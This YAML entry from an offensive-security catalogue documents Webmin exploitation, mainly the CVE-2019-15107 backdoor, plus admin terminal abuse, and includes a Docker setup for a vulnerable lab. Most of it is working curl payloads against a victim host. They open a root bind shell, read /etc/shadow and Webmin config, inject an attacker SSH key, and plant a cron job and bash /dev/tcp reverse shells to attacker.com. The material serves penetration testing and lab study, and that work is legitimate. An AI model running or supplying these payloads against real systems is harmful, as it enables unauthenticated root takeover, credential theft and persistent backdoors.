---
comment: |
  Webmin is a web-based system administration interface for Unix/Linux, typically
  running on port 10000 as root. Two notable exploitation paths exist:

  1. CVE-2019-15107 (CVSS 9.8): A backdoor was covertly inserted into Webmin 1.890
     distributed via SourceForge. The password_change.cgi script executes the value
     of the `old` parameter as a shell command when `expired=2` is present, without
     requiring authentication. The backdoor was present for approximately 12 months.

  2. CVE-2022-0824 (CVSS 8.8): Authenticated low-privileged Webmin users can read
     arbitrary files and execute OS commands as root by exploiting the file manager
     module's lack of privilege validation. Affects Webmin < 1.990.

  Admin-level RCE without a CVE: Webmin exposes a direct terminal interface
  (Tools > Terminal) and custom command execution (Others > Custom Commands)
  that run as root on the host system.
docker:
  compose: "services:\n  webmin:\n    image: vulnerable/webmin:1.890\n    ports:\n\
    \      - \"10000:10000\"\n    environment:\n      ROOT_PASSWORD: root\n"
  note: "Starts Webmin 1.890 (vulnerable to CVE-2019-15107 unauthenticated RCE backdoor).\n\
    Access at `https://localhost:10000` (self-signed TLS \u2014 use curl -k).\nThe\
    \ backdoor in password_change.cgi fires without login. No setup required.\nDefault\
    \ credentials (if needed for admin paths): root / root or admin / admin.\n"
functions:
  bind-shell:
  - code: |
      # CVE-2019-15107: bind shell via backdoor
      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
        --data-urlencode "user=root" \
        --data-urlencode "pam=" \
        --data-urlencode "expired=2" \
        --data-urlencode "old=ncat -lvp 12345 -e /bin/sh &" \
        --data-urlencode "new1=x" \
        --data-urlencode "new2=x"
    comment: |
      CVE-2019-15107: opens a root bind shell on TCP 12345 via the backdoor.
      The trailing & detaches ncat from the HTTP request. Connect with: nc victim.com 12345
      Requires ncat (nmap package). The shell runs as root.
    connector: tcp-client
    contexts:
      unauthenticated:
    platform: linux
    tty: false
    version: |
      1.890 (backdoored SourceForge release)
  file-read:
  - code: |
      # CVE-2019-15107: read arbitrary files via command injection in password_change.cgi
      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
        --data-urlencode "user=root" \
        --data-urlencode "pam=" \
        --data-urlencode "expired=2" \
        --data-urlencode "old=cat /etc/shadow" \
        --data-urlencode "new1=x" \
        --data-urlencode "new2=x"

      # Read Webmin configuration (contains module passwords and settings):
      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
        --data-urlencode "user=root" \
        --data-urlencode "pam=" \
        --data-urlencode "expired=2" \
        --data-urlencode "old=cat /etc/webmin/miniserv.conf" \
        --data-urlencode "new1=x" \
        --data-urlencode "new2=x"
    comment: |
      CVE-2019-15107: reads arbitrary server-side files via the backdoor command injection.
      Webmin runs as root, so all files are readable.
      Key files:
      - /etc/shadow  (hashed passwords for all system users)
      - /etc/webmin/miniserv.conf  (Webmin config: session keys, SSL certs, ACLs)
      - /root/.ssh/id_rsa  (SSH private key for root)
      - /etc/webmin/*.acl  (per-module ACL configuration)
    contexts:
      unauthenticated:
    version: |
      1.890 (backdoored SourceForge release)
  file-write:
  - code: |
      # CVE-2019-15107: write arbitrary files via backdoor (runs as root)
      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
        --data-urlencode "user=root" \
        --data-urlencode "pam=" \
        --data-urlencode "expired=2" \
        --data-urlencode "old=echo 'ssh-ed25519 AAAA...attacker_key... attacker' >> /root/.ssh/authorized_keys" \
        --data-urlencode "new1=x" \
        --data-urlencode "new2=x"

      # Or add a cron backdoor:
      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
        --data-urlencode "user=root" \
        --data-urlencode "pam=" \
        --data-urlencode "expired=2" \
        --data-urlencode "old=echo '* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1' > /etc/cron.d/backdoor" \
        --data-urlencode "new1=x" \
        --data-urlencode "new2=x"
    comment: |
      CVE-2019-15107: write arbitrary files as root via the backdoor command injection.
      Since Webmin runs as root, any path on the filesystem is writable.
      SSH key injection provides persistent, passwordless root access.
    contexts:
      unauthenticated:
    version: |
      1.890 (backdoored SourceForge release)
  rce:
  - code: |
      # CVE-2019-15107: unauthenticated RCE via backdoor in password_change.cgi
      # The `old` parameter is passed to Perl's backtick operator when expired=2
      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
        -d "user=root&pam=&expired=2&old=id|tee+/tmp/out&new1=x&new2=x"

      # Or use GET (both methods work):
      curl -sk "https://victim.com:10000/password_change.cgi?user=root&pam=&expired=2&old=id|tee+/tmp/out&new1=x&new2=x"
    comment: "CVE-2019-15107: Webmin 1.890 distributed from SourceForge contained\
      \ a backdoor\nin password_change.cgi. When expired=2 is set, the script executes:\n\
      \  system(\"$old_password\") or open(FILE,\"$old_password |\")\ninjecting the\
      \ `old` parameter value into a shell command without sanitisation.\nNo authentication\
      \ required. Command output is returned in the HTTP response body.\nThe backdoor\
      \ was in Webmin 1.890 only \u2014 verify the version before attempting.\nRef:\
      \ https://www.exploit-db.com/exploits/47230\nMetasploit: use exploit/unix/webapp/webmin_backdoor\n\
      nuclei: CVE-2019-15107\n"
    contexts:
      unauthenticated:
    version: |
      1.890 (backdoored SourceForge release)
  - code: |
      # Admin RCE via Webmin Terminal (Tools > Terminal)
      # Navigate to: https://victim.com:10000/terminal/index.cgi
      # The terminal provides a full interactive shell session in the browser as root.
      # Equivalent via the Others > Custom Commands module (requires custom commands enabled):
      curl -sk -X POST "https://victim.com:10000/custom/run.cgi" \
        -b "sid=<session_id>" \
        --data-urlencode "cmd=id"
    comment: |
      Webmin runs as root and exposes a direct terminal interface at Tools > Terminal
      (/terminal/index.cgi). Any authenticated administrator obtains an immediate root
      shell in the browser. No additional exploitation steps required.
      The Custom Commands module (Others > Custom Commands) allows creating and running
      arbitrary shell commands via the web UI or the /custom/run.cgi endpoint.
      Session ID is obtained by POSTing credentials to /session_login.cgi.
    contexts:
      admin:
  reverse-shell:
  - blind: true
    code: |
      # CVE-2019-15107: reverse bash shell via backdoor pipe injection
      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
        --data-urlencode "user=root" \
        --data-urlencode "pam=" \
        --data-urlencode "expired=2" \
        --data-urlencode "old=bash -i >& /dev/tcp/attacker.com/12345 0>&1" \
        --data-urlencode "new1=x" \
        --data-urlencode "new2=x"
    comment: "CVE-2019-15107: spawns a reverse root shell via the password_change.cgi\
      \ backdoor.\nThe shell runs as root since Webmin's miniserv daemon runs as root\
      \ by default.\nThe HTTP response returns immediately \u2014 check the listener\
      \ for the connection.\n"
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      1.890 (backdoored SourceForge release)
  - blind: true
    code: |
      # Admin reverse shell via Custom Commands or Terminal module
      # POST to the session login endpoint to obtain a session cookie:
      SID=$(curl -sk -c /tmp/wm.jar -X POST "https://victim.com:10000/session_login.cgi" \
        -d "page=%2F&user=root&pass=root" -D - | grep "sid=" | sed 's/.*sid=//;s/;.*//')

      # Execute a reverse shell via the terminal API:
      curl -sk -X POST "https://victim.com:10000/terminal/index.cgi" \
        -b "sid=${SID}" \
        --data-urlencode "cmd=bash -i >& /dev/tcp/attacker.com/12345 0>&1 &"
    comment: |
      Admin reverse shell via the Webmin Terminal module. The session cookie is obtained
      by authenticating to /session_login.cgi. The shell runs as root.
      Alternative: use the Custom Commands module at /custom/run.cgi.
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
...
